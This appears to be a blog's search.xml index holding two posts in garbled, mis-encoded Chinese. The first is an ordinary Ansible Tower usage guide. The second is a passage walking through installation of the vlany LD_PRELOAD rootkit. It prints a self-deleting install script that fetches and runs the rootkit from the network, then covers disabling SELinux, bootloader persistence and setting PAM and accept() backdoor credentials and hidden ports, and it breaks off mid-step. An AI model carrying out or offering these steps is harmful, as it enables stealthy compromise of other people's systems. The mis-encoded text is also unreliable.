<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>ansible tower å®æˆ˜ä½¿ç”¨è¯¦è§£</title>
      <link href="/2018/11/21/tower-useage/"/>
      <url>/2018/11/21/tower-useage/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-001.jpg" alt="kionf"></p><blockquote class="blockquote-center"><p>ansible tower 3.3.1 å®æˆ˜ä½¿ç”¨ï¼Œæ­¤æ–‡æ¡£ä¸ºè¿›é˜¶ä½¿ç”¨ä¸æ˜¯ç½‘ä¸Šçƒ‚å¤§è¡—çš„å®‰è£…éƒ¨ç½²ï¼Œå¦‚éœ€å®‰è£…é…ç½®ä»‹ç»ç§»æ­¥<a href="https://kionf.com/2017/07/24/linux-tower">ansible-towerå®‰è£…åŠç ´è§£</a>å‰å‡ å¹´å°±äº†è§£è¿‡toweré‚£æ—¶ä½¿ç”¨æ„Ÿè§‰ä»–çš„ç‚¹å­éªšï¼Œä½†ä½¿ç”¨ä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ã€‚ç»è¿‡3.0å¤§æ”¹ç‰ˆåï¼Œç”¨ç€å¾ˆèˆ’å¦ï¼ï¼</p></blockquote><a id="more"></a><p><br></p><h1 id="0x00-ä»‹ç»"><a href="#0x00-ä»‹ç»" class="headerlink" title="0x00 ä»‹ç»"></a>0x00 ä»‹ç»</h1><p>å…³äºAnsible Tower è¿™é‡Œä¸å¤šä»‹ç»ï¼Œå±äºå‘å¸ƒé…ç½®ç®¡ç†ç³»ç»Ÿï¼Œæ”¯æŒApiåŠç•Œé¢æ“ä½œï¼ŒDjangoç¼–å†™ã€‚<strong>â˜ï¸å­—å±Œ</strong></p><figure class="highlight plain"><figcaption><span class="caption">å®éªŒç¯å¢ƒ</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">CentOS Linux release 7.4.1708</div><div class="line">Ansible Tower 3.3.1</div><div class="line">ä¸‹è½½åœ°å€ï¼š https://releases.ansible.com/ansible-tower/setup/</div><div class="line">å‚è€ƒæ–‡æ¡£ï¼šhttps://docs.ansible.com/ansible-tower/latest/html/</div></pre></div></div></figure><p>å…³äºæ–°ç‰ˆå¯¼èˆªæ ä»‹ç»</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line"># viewes</div><div class="line">Dashboard           ä»ªè¡¨ç›˜å±•ç¤ºä¿¡æ¯çš„</div><div class="line">Jobs                è·‘è¿‡çš„ä»»åŠ¡è®°å½•</div><div class="line">Schedules           è®¡åˆ’ä»»åŠ¡</div><div class="line">My View             æŸ¥çœ‹ç”¨æˆ·çš„å·¥ä½œæ¨¡ç‰ˆï¼Œå’Œä»»åŠ¡è®°å½•</div><div class="line"></div><div class="line"># resources</div><div class="line">Templates           ä»»åŠ¡æ¨¡ç‰ˆï¼Œé…ç½®è°ƒç”¨playbookæ‰§è¡Œæ—¶çš„å„ç§å‚æ•°ï¼Œä»æ­¤å¤„æ·»åŠ è®¡åˆ’ä»»åŠ¡</div><div class="line">Credentials         é…ç½®è¿æ¥ æœºå™¨/äº‘ä¸»æœºapi Key/è‡ªå®šä¹‰çš„å‡­è¯ç±»å‹ çš„è´¦å·å¯†ç ç­‰ä¿¡æ¯</div><div class="line">Projects            è¿™é‡Œé…ç½®é¡¹ç›®å¯¹åº”çš„playbookï¼Œå¯ä»¥ä»Gitä¸Šæ‹‰å–æˆ–ä»æœ¬åœ°æ–‡ä»¶å¤¹è¯»å–playbook</div><div class="line">Inventories         èµ„äº§æ¸…å•</div><div class="line">Inventory Scripts   è‡ªå®šä¹‰è·å–èµ„äº§æ¸…å•çš„è„šæœ¬</div><div class="line"></div><div class="line"># access</div><div class="line">Organizations       ç»„ç»‡ç®¡ç†</div><div class="line">Users               ç”¨æˆ·ç®¡ç†</div><div class="line">Teams               ç”¨æˆ·ç»„ç®¡ç†</div><div class="line"></div><div class="line"># Administration</div><div class="line">Credential Types    è‡ªå®šä¹‰å‡­è¯ç±»å‹ï¼Œæ·»åŠ åå¯åœ¨Credentialsä¸­ä½¿ç”¨</div><div class="line">Notifications       é…ç½®ä»»åŠ¡é€šçŸ¥ï¼Œæ”¯æŒç”µå­é‚®ä»¶ï¼ŒTwillioç”µè¯ç­‰</div><div class="line">Management Jobs     è®¡åˆ’ä»»åŠ¡ç®¡ç†</div><div class="line">Instance Groups     èµ„äº§ç»„ç®¡ç†</div><div class="line">Applications        è‡ªå®šä¹‰åº”ç”¨</div><div class="line">Settings            è®¾ç½®</div></pre></div></div></figure><blockquote><p>åˆå§‹æµç¨‹ï¼šä»<code>Inventories</code>æ·»åŠ ä¸»æœº &gt; <code>Credentials</code>æ·»åŠ è¿æ¥æœºå™¨å¯†ç /æ·»åŠ gitè´¦å·ï¼ˆç”¨æ¥Projectsä»Gitæ‹‰å–Playbookï¼‰ &gt; <code>Projects</code>é…ç½®playbookè·å–æ–¹å¼ &gt; <code>Templates</code>æŒ‡å®šé‚£äº›æœºå™¨è·‘Playbookï¼Œå’Œè¿è¡Œæ—¶çš„å‚æ•°</p></blockquote><hr><h1 id="0x01-å¦‚ä½•æ‰¹é‡å¯¼å…¥èµ„äº§"><a href="#0x01-å¦‚ä½•æ‰¹é‡å¯¼å…¥èµ„äº§" class="headerlink" title="0x01 å¦‚ä½•æ‰¹é‡å¯¼å…¥èµ„äº§"></a>0x01 å¦‚ä½•æ‰¹é‡å¯¼å…¥èµ„äº§</h1><p>æ–°ç‰ˆæœ¬çš„ansible-toweréå¸¸å¼ºå¤§ï¼Œç¬”è€…ç›¸ä¿¡ä»–ä¸€å®šèƒ½ç«™èµ·æ¥ã€‚å…³äºèµ„äº§çš„å¯¼å…¥<code>ansible tower</code>å†…éƒ¨æ”¯æŒä»äº‘å‚å•†æˆ–è€…ç§æœ‰è™šæ‹ŸåŒ–äº‘ç›´æ¥å¯¼å…¥æœºå™¨ï¼Œå¦‚æœä½ ä½¿ç”¨çš„äº‘å‚å•†ä¸æ”¯æŒï¼Œè¿˜å¯è‡ªå·±ç¼–å†™python/shellè„šæœ¬æ¥è°ƒç”¨äº‘å‚å•†APIæ·»åŠ åˆ°<code>ansible tower</code>èµ„äº§ä¸­ã€‚æŠ“ç´§ Letâ€™s Go</p><h2 id="1-é€šè¿‡UIç•Œé¢å¯¼å…¥"><a href="#1-é€šè¿‡UIç•Œé¢å¯¼å…¥" class="headerlink" title="1. é€šè¿‡UIç•Œé¢å¯¼å…¥"></a>1. é€šè¿‡UIç•Œé¢å¯¼å…¥</h2><p>ç‚¹å‡»<code>Inventories</code>ç‚¹å‡»æ·»åŠ æŒ‰é’®ï¼Œä¼šæç¤ºå‡ºä¸¤ç§<code>Inventory</code>ï¼š<code>Inventory æ­£å¸¸çš„èµ„äº§</code>ï¼Œ <code>Smart Inventory æ ¹æ®ä»Inventoryç­›é€‰æ¡ä»¶å˜åŒ–çš„</code></p><h3 id="1ï¼‰æ·»åŠ Inventory"><a href="#1ï¼‰æ·»åŠ Inventory" class="headerlink" title="1ï¼‰æ·»åŠ Inventory"></a>1ï¼‰æ·»åŠ Inventory</h3><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-002.jpg" alt="Inventory"></p><p>ä¿å­˜ååœ¨ç‚¹å‡»<code>HOSTS</code>æ·»åŠ ä¸»æœº</p><h3 id="2ï¼‰æ·»åŠ Smart-Inventory"><a href="#2ï¼‰æ·»åŠ Smart-Inventory" class="headerlink" title="2ï¼‰æ·»åŠ Smart Inventory"></a>2ï¼‰æ·»åŠ Smart Inventory</h3><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-003.jpg" alt="smart Inventory"></p><p>Smart Inventory æ˜¯é€šè¿‡ç­›é€‰IP/ä¸»æœºåç§°/idèŒƒå›´ æ¥å®šä¹‰çš„ä¸»æœºæ¸…å•</p><h2 id="2-é€šè¿‡å‘½ä»¤è¡Œtower-manageæ‰¹é‡æ·»åŠ ä¸»æœº"><a href="#2-é€šè¿‡å‘½ä»¤è¡Œtower-manageæ‰¹é‡æ·»åŠ ä¸»æœº" class="headerlink" title="2. é€šè¿‡å‘½ä»¤è¡Œtower-manageæ‰¹é‡æ·»åŠ ä¸»æœº"></a>2. é€šè¿‡å‘½ä»¤è¡Œ<code>tower-manage</code>æ‰¹é‡æ·»åŠ ä¸»æœº</h2><p>é€šè¿‡Towerè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·<code>tower-manage</code>æ¥æ‰¹é‡å¯¼å…¥ä¸»æœºï¼Œå¯ä»¥ä»ä¸»æœºçš„<code>/etc/ansible/hosts</code>ä¸­ç›´æ¥å¯¼å…¥</p><figure class="highlight yaml"><figcaption><span class="caption">ç¤ºä¾‹æ–‡ä»¶</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="string">[test:children]</span></div><div class="line"><span class="string">test-signal</span></div><div class="line"><span class="string">test-mysql</span></div><div class="line"><span class="string">test-rtc</span></div><div class="line"><span class="string">test-tomcat</span></div><div class="line"></div><div class="line"><span class="string">[test-rtc]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.193</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.189</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.187</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-mysql]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.186</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.185</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-signal]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.190</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.191</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.197</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.198</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-tomcat]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.184</span> <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.188</span> <span class="string">ansible_ssh_user=root</span></div><div class="line"></div><div class="line"><span class="string">[test-nginx]</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.191</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div><div class="line"><span class="number">172.16</span><span class="number">.8</span><span class="number">.190</span>    <span class="string">ansible_ssh_port=52330</span>  <span class="string">ansible_ssh_user=root</span></div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">å‘½ä»¤å¯¼å…¥åˆ°èµ„äº§æ¸…å•</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">tower-manage inventory_import --source=/etc/ansible/hosts --group-filter=test --inventory-name=æµ‹è¯•ç¯å¢ƒ --keep-vars</div><div class="line"></div><div class="line"></div><div class="line">    1.569 INFO     Updating inventory 7: æµ‹è¯•ç¯å¢ƒ</div><div class="line">    1.674 INFO     Reading Ansible inventory source: /etc/ansible/hosts</div><div class="line">    3.003 INFO     Processing JSON output...</div><div class="line">    3.004 INFO     Loaded 7 groups, 11 hosts</div><div class="line">    3.292 INFO     Inventory import completed for  (æµ‹è¯•ç¯å¢ƒ - 17) in 1.7s</div></pre></div></div></figure><p><strong>é€‰é¡¹ä»‹ç»ï¼š</strong></p><figure class="highlight shell"><div class="figcode"><div class="code"><pre><div class="line">--source            æŒ‡å®šinventoryæ–‡ä»¶</div><div class="line">--group-filter      ä»æ–‡ä»¶ä¸­é€šè¿‡ç»„åè¿‡æ»¤</div><div class="line">--host-filter       é€šè¿‡host nameè¿‡æ»¤</div><div class="line">--inventory-name    å¯¼å…¥åˆ°æŒ‡å®šåç§°èµ„äº§æ¸…å•</div><div class="line">--inventory-id      å¯¼å…¥åˆ°æŒ‡å®šIDçš„èµ„äº§æ¸…å•</div><div class="line"><span class="meta">#</span><span class="bash"> name å’Œ id é€‰ä¸€ä¸ª</span></div><div class="line"></div><div class="line">--overwrite         è¦†ç›–ä¸»æœºå’Œç»„ï¼Œé»˜è®¤ä¸è¦†ç›–</div><div class="line">--overwrite-vars    è¦†ç›–ä¸»æœºå˜é‡</div><div class="line">--keep-vars         ä¿æŒä¸»æœºå˜é‡</div><div class="line"></div><div class="line">--enabled-value     å¯¼å…¥çš„ä¸»æœºçŠ¶æ€æ˜¯å¦æ¿€æ´»é»˜è®¤æ¿€æ´»</div></pre></div></div></figure><p><strong>å¯¼å…¥ç»“æœ</strong></p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-004.jpg" alt="tower-manage"></p><h2 id="3-å¯¼å…¥äº‘å‚å•†ä¸»æœº"><a href="#3-å¯¼å…¥äº‘å‚å•†ä¸»æœº" class="headerlink" title="3. å¯¼å…¥äº‘å‚å•†ä¸»æœº"></a>3. å¯¼å…¥äº‘å‚å•†ä¸»æœº</h2><div class="note danger"><p>æš‚æœªä½¿ç”¨ğŸ˜‚</p></div><hr><h1 id="0x02-åˆ›å»ºå‡­è¯"><a href="#0x02-åˆ›å»ºå‡­è¯" class="headerlink" title="0x02 åˆ›å»ºå‡­è¯"></a>0x02 åˆ›å»ºå‡­è¯</h1><p>å¯ä»¥åˆ›å»ºå„ç§å„æ ·çš„å‡­è¯ï¼Œè¿æ¥äº‘å‚å•†Apiçš„å‡­è¯/è¿æ¥gitlabçš„å‡­è¯/è¿æ¥Linuxä¸»æœºçš„å‡­è¯/è‡ªå®šä¹‰çš„å‡­è¯ç­‰ç­‰ã€‚ã€‚æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªGitlabè®¤è¯ç”¨æ¥æ‹‰å–æˆ‘ä»¬çš„Playbook</p><h2 id="1-åˆ›å»ºç‰ˆæœ¬æ§åˆ¶å‡­è¯"><a href="#1-åˆ›å»ºç‰ˆæœ¬æ§åˆ¶å‡­è¯" class="headerlink" title="1. åˆ›å»ºç‰ˆæœ¬æ§åˆ¶å‡­è¯"></a>1. åˆ›å»ºç‰ˆæœ¬æ§åˆ¶å‡­è¯</h2><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-005.jpg" alt="tower-manage"></p><p><code>Credential Type</code>é€‰æ‹©<code>Source Control</code> </p><h2 id="2-åˆ›å»ºç™»é™†æœºå™¨å‡­è¯"><a href="#2-åˆ›å»ºç™»é™†æœºå™¨å‡­è¯" class="headerlink" title="2. åˆ›å»ºç™»é™†æœºå™¨å‡­è¯"></a>2. åˆ›å»ºç™»é™†æœºå™¨å‡­è¯</h2><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-006.jpg" alt="tower-manage"></p><p><code>Credential Type</code> é€‰æ‹© <code>Machine</code></p><hr><h1 id="0x03-åˆ›å»ºé¡¹ç›®"><a href="#0x03-åˆ›å»ºé¡¹ç›®" class="headerlink" title="0x03 åˆ›å»ºé¡¹ç›®"></a>0x03 åˆ›å»ºé¡¹ç›®</h1><p><code>playbook</code>æ‹‰å–çš„æ–¹å¼ä¸»è¦æœ‰ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">- Manual        ä»æœ¬åœ°ç›®å½•è¯»å–</div><div class="line">- Git           ä»Gitæ‹‰å–</div><div class="line">- Mercurial     ä»mer</div><div class="line">- SVN</div><div class="line">- RedHatInsights</div></pre></div></div></figure><p>è¿™é‡Œé€‰ç”¨Gitä»Gitlabä¸Šæ‹‰å–</p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-007.jpg" alt="tower-manage"></p><p>Optionsé€‰é¡¹é…ç½®ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">- Clean </div><div class="line">åœ¨ä»gitlabæ‹‰å–å‰æ¸…é™¤æœ¬åœ°ä¿®æ”¹çš„playbook</div><div class="line">- Delete on Update </div><div class="line">å½“æ›´æ–°æ—¶åˆ é™¤æ‰€æœ‰æœ¬åœ°å‚¨å­˜playbook</div><div class="line">- Update Revision on Launch </div><div class="line">å½“Templatesä»»åŠ¡è¿è¡Œæ—¶ï¼Œè‡ªåŠ¨ä»gitæ‹‰å–æ›´æ–°</div></pre></div></div></figure><p>tower æµ‹è¯•playbookåœ°å€ï¼š<a href="https://github.com/ansible/tower-example.git" target="_blank" rel="noopener">tower-example</a></p><hr><h1 id="0x04-åˆ›å»ºä»»åŠ¡æ¨¡æ¿"><a href="#0x04-åˆ›å»ºä»»åŠ¡æ¨¡æ¿" class="headerlink" title="0x04 åˆ›å»ºä»»åŠ¡æ¨¡æ¿"></a>0x04 åˆ›å»ºä»»åŠ¡æ¨¡æ¿</h1><p>æœ€åä¸€æ­¥æ¥äº†,åˆ›å»º<code>Templates</code></p><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-008.jpg" alt="tower-templates"></p><p>Optionsé€‰é¡¹é…ç½®ï¼š</p><figure class="highlight shell"><div class="figcode"><div class="code"><pre><div class="line">- Enable Privilege Escalation </div><div class="line"><span class="meta">#</span><span class="bash"> é»˜è®¤è„šæœ¬ä»¥awxç”¨æˆ·æ‰§è¡Œplaybookï¼Œå¼€å¯åä½¿ç”¨ç®¡ç†å‘˜èº«ä»½</span></div><div class="line">- Allow Provisioning Callbacks </div><div class="line"><span class="meta">#</span><span class="bash"> è¿è¡Œé€šè¿‡urlå›è°ƒæ¥å¯åŠ¨è¿™ä¸ªä»»åŠ¡</span></div><div class="line">- Enable Concurrent Jobs </div><div class="line"><span class="meta">#</span><span class="bash"> å…è®¸ç›¸åŒä»»åŠ¡ä¸€èµ·è¿è¡Œ</span></div><div class="line">- Use Fact Cache </div><div class="line"><span class="meta">#</span><span class="bash"> ä½¿ç”¨ç¼“å­˜</span></div></pre></div></div></figure><p> ç‚¹å‡»<code>SCHEDULES</code>å¯ä»¥æ·»åŠ è®¡åˆ’ä»»åŠ¡</p><hr><h1 id="0x05-å®Œç»“"><a href="#0x05-å®Œç»“" class="headerlink" title="0x05 å®Œç»“"></a>0x05 å®Œç»“</h1><p><img src="https://kionf.com/article_images/ansible-tower/ansible-tower-009.jpg" alt="tower-templates"></p><p>æˆ‘ç›¸ä¿¡Towerä¼šç«™èµ·æ¥ğŸ˜‚ï¼Œåç»­å†è¡¥å……ã€‚</p><p><strong> å‚è€ƒï¼š</strong></p><blockquote><p><a href="https://docs.ansible.com/ansible-tower/latest/html/" target="_blank" rel="noopener">https://docs.ansible.com/ansible-tower/latest/html/</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> ansible tower </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible-Tower </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LinuxåŠ¨æ€é“¾æ¥åº“é¢„åŠ è½½å‹åé—¨ï¼ŒVlanyå®‰è£…åŠåˆ†æ</title>
      <link href="/2018/10/25/rookit-vlany/"/>
      <url>/2018/10/25/rookit-vlany/</url>
      <content type="html"><![CDATA[<script id="asciicast-QDmzYWjPylDMA0gyMlSR0xvbx" src="https://asciinema.org/a/QDmzYWjPylDMA0gyMlSR0xvbx.js" async></script><blockquote class="blockquote-center"><p>æ­¤å·¥å…·<strong><a href="https://github.com/mempodippy/vlany" title="vlany Github" target="_blank" rel="noopener">vlany</a></strong>é€šè¿‡<code>LD_PRELOAD</code>ç¯å¢ƒå˜é‡å’Œ/etc/ld.so.preloadçš„é…ç½®æ–‡ä»¶æ¥é‡å†™ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ŒåŠ è½½æ”»å‡»è€…è‡ªå®šä¹‰çš„æ¶æ„å‡½æ•°ã€‚</p></blockquote><a id="more"></a><h1 id="0x00-å·¥å…·åŸç†åˆ†æ"><a href="#0x00-å·¥å…·åŸç†åˆ†æ" class="headerlink" title="0x00 å·¥å…·åŸç†åˆ†æ"></a>0x00 å·¥å…·åŸç†åˆ†æ</h1><p>  é¢„åŠ è½½åŠ¨æ€è¿æ¥åº“è¿™ç§åˆ©ç”¨æŠ€æœ¯ï¼Œåœ¨æ—©äº›å¹´å›½å¤–å°±å·²ç»æœ‰è¿‡åˆ©ç”¨ç›¸å…³çš„æ–‡ç« ã€‚åªæ˜¯è¿‘å¹´å›½å†…æ¶æ„è½¯ä»¶åˆ©ç”¨é¢‘ç¹è¢«å„å¤§å®‰å…¨å‚å•†æ•è·åˆ†æï¼Œä¹Ÿå°±æ¸æ¸å…¬å¸ƒåœ¨å¤§ä¼—çœ¼å‰ã€‚å¯¹äºè¿™ç§åˆ©ç”¨çš„å¤§æ¦‚åŸç†ï¼Œå·²æœ‰æ–‡ç« åšäº†æ·±å…¥åˆ†æï¼Œè¿™é‡Œå°±ä¸é‡å¤é€ è½®ã€‚æ–‡ç« åœ°å€ï¼š<a href="http://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">è­¦æƒ•åˆ©ç”¨Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“çš„åé—¨</a></p><hr><h1 id="0x01-ä¸‹è½½é¡¹ç›®"><a href="#0x01-ä¸‹è½½é¡¹ç›®" class="headerlink" title="0x01 ä¸‹è½½é¡¹ç›®"></a>0x01 ä¸‹è½½é¡¹ç›®</h1><figure class="highlight sh"><figcaption><span class="caption">å®éªŒç¯å¢ƒ</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">CentOS-6.9  å†…æ ¸ï¼š2.6.32-696.el6.x86_64    æ¶æ„ï¼šx86_64</div><div class="line marked">Kali-2018   å†…æ ¸ï¼š4.17.0-kali1-amd64       æ¶æ„ï¼šx86_64 <span class="comment">#ä¸æ”¯æŒ</span></div></pre></div></div></figure><p><br></p><p>ç¼–è¾‘æ–‡ä»¶<code>quick_install.sh</code>ï¼š</p><figure class="highlight sh"><figcaption><span class="caption">åé—¨å®‰è£…è„šæœ¬</span><a href="https://github.com/mempodippy/vlany" target="_blank">é¡¹ç›®åœ°å€</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line">[ $(id -u) != 0 ] &amp;&amp; &#123; <span class="built_in">echo</span> <span class="string">"Not root. Exiting."</span>; <span class="built_in">exit</span>; &#125;</div><div class="line"></div><div class="line">WORKING_DIR=<span class="string">"/tmp/.<span class="variable">$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)</span>"</span></div><div class="line">ARCHIVE_NAME=<span class="string">"<span class="variable">$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)</span>.tar.gz"</span></div><div class="line"></div><div class="line">mkdir <span class="variable">$WORKING_DIR</span> &amp;&amp; <span class="built_in">cd</span> <span class="variable">$WORKING_DIR</span></div><div class="line">wget https://github.com/mempodippy/vlany/archive/master.tar.gz -O <span class="variable">$ARCHIVE_NAME</span></div><div class="line">tar xvpfz <span class="variable">$ARCHIVE_NAME</span> &amp;&amp; rm <span class="variable">$ARCHIVE_NAME</span></div><div class="line"><span class="built_in">cd</span> vlany-master</div><div class="line">chmod +x install.sh</div><div class="line marked">./install.sh</div><div class="line"></div><div class="line">rm -rf <span class="variable">$WORKING_DIR</span></div><div class="line"><span class="comment">#ä¸‹è½½å®Œååˆ é™¤é¡¹ç›®</span></div><div class="line">rm -f <span class="variable">$0</span></div><div class="line"><span class="comment">#æ‰§è¡Œååˆ é™¤è‡ªèº«è„šæœ¬</span></div></pre></div></div></figure><hr><h1 id="0x02-ç¼–è¯‘å®‰è£…"><a href="#0x02-ç¼–è¯‘å®‰è£…" class="headerlink" title="0x02 ç¼–è¯‘å®‰è£…"></a>0x02 ç¼–è¯‘å®‰è£…</h1><div class="note danger"><p><code>quick_install.sh</code>ä¸‹è½½é¡¹ç›®åè§£å‹è°ƒç”¨<code>install.sh</code>è„šæœ¬ï¼Œé¦–å…ˆä¼šæ£€æµ‹SElinuxæ˜¯å¦å…³é—­å¦‚æœæ²¡å…³é—­ï¼Œè„šæœ¬ä¼šå…³é—­SElinuxã€‚æ­¤æ—¶éœ€è¦é‡å¯æœºå™¨ã€‚</p></div><p>å®é™…åº”ç”¨ä¸­ï¼Œå¦‚æœä¸æƒ³é‡å¯æœºå™¨ï¼Œå¯ä»¥å•ç‹¬ä¸‹è½½é¡¹ç›®æ‰§è¡Œå‘½ä»¤<br><code>wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-master</code><br>é‡æ–°å»ºç«‹ç»ˆç«¯ï¼Œç„¶åè¾“å…¥<code>setenforce 0</code>ï¼Œå†æ›´æ”¹<code>install.sh</code>è„šæœ¬</p><figure class="highlight sh"><figcaption><span class="caption">install</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line">    <span class="keyword">if</span> [[ $(sestatus -v | head -n 1) == *<span class="string">"enabled"</span>* ]]; <span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"SELinux is still enabled. Reboot."</span></div><div class="line diff-deletion">        <span class="built_in">exit</span> <span class="comment"># æ³¨é‡Šæ­¤è¡Œ</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"SELinux is disabled."</span></div><div class="line">    <span class="keyword">fi</span></div></pre></div></div></figure><p>æ£€éªŒå®ŒSElinuxï¼Œç¨‹åºå‡ºç°æç¤ºæ¡†é€‰åœ¨grubé…ç½®ä½ç½®ï¼Œæ¥ç¡®è®¤å½“æœºå™¨é‡å¯å åé—¨ä¾ç„¶ç”Ÿæ•ˆã€‚æ ¹æ®æœºå™¨å®é™…æƒ…å†µå¡«å†™ï¼Œé»˜è®¤<code>/etc/grub.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">Enter location of bootloader config file (<span class="keyword">if</span> grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]:</div></pre></div></div></figure><p>ç„¶åä¸€è·¯å›è½¦ï¼Œç­‰å¾…<code>gcc</code>ç­‰ä¾èµ–å®‰è£…å®Œæˆï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢ã€‚é€‰æ‹©æ˜¯ç¼–è¯‘å¹¶å®‰è£…ï¼Œè¿˜æ˜¯åªç¼–è¯‘ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰åœ¨<code>YES</code></p><p><img src="https://kionf.com/article_images/vlany/vlany-01.jpg" alt="vlany-01"></p><h2 id="1-é…ç½®PAMåé—¨"><a href="#1-é…ç½®PAMåé—¨" class="headerlink" title="1. é…ç½®PAMåé—¨"></a>1. é…ç½®PAMåé—¨</h2><p>å†ä¸€è·¯å›è½¦ï¼Œåˆ°å¦‚ä¸‹ç•Œé¢ã€‚è®¾ç½®é€šè¿‡<code>ssh</code>è¿æ¥çš„PAMç”¨æˆ·åï¼Œ<strong>è®°ä½æ­¤åé—¨ç”¨æˆ·å</strong></p><p><img src="https://kionf.com/article_images/vlany/vlany-02.jpg" alt="vlany-02"></p><p>ç„¶åè®¾ç½®PAMå¯†ç ï¼Œè¿™é‡Œè¾“å…¥å¯†ç ä¸ä¼šå›æ˜¾ä»»ä½•ä¸œè¥¿ï¼Œç»§ç»­è¾“å…¥å°±ok</p><p><img src="https://kionf.com/article_images/vlany/vlany-03.jpg" alt="vlany-03"></p><p>è®¾ç½®PAMç«¯å£ï¼Œä¹Ÿæ˜¯éœ€è¦éšè—çš„ç«¯å£</p><p><img src="https://kionf.com/article_images/vlany/vlany-04.jpg" alt="vlany-04"></p><h2 id="2-é…ç½®accept-åé—¨"><a href="#2-é…ç½®accept-åé—¨" class="headerlink" title="2. é…ç½®accept()åé—¨"></a>2. é…ç½®<code>accept()</code>åé—¨</h2><p>è®¾ç½®è¿æ¥æ˜¯å¦ä½¿ç”¨<code>SSL</code>åŠ å¯†ï¼Œè¿™æµ‹è¯•é€‰æ‹©<code>NO</code></p><p><img src="https://kionf.com/article_images/vlany/vlany-05.jpg" alt="vlany-05"></p><p>è®¾ç½®<code>accept()</code>åé—¨å¯†ç ï¼Œä¸€æ ·æ²¡æœ‰å›æ˜¾ã€‚</p><p><img src="https://kionf.com/article_images/vlany/vlany-06.jpg" alt="vlany-06"></p><p>è®¾ç½®<code>accept()</code>åé—¨éšè—ç«¯å£</p><p><img src="https://kionf.com/article_images/vlany/vlany-07.jpg" alt="vlany-07"></p><p>è®¾ç½®<code>execve()</code>å¯†ç 